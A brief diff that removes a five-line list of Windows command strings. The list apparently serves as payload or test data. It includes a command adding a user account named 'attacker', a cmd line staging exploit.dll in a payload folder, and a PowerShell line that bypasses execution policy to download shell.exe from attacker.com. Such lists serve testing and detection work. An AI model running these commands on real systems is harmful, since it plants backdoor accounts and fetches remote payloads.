@@ -1,5 +1,0 @@
-calc.exe
-cmd.exe /c "echo .spl & start notepad.exe"
-cmd.exe /c "mkdir C:\Temp\payload && move exploit.dll C:\Temp\payload\"
-net.exe user attacker Password123 /add
-powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://attacker.com/shell.exe -OutFile shell.exe"
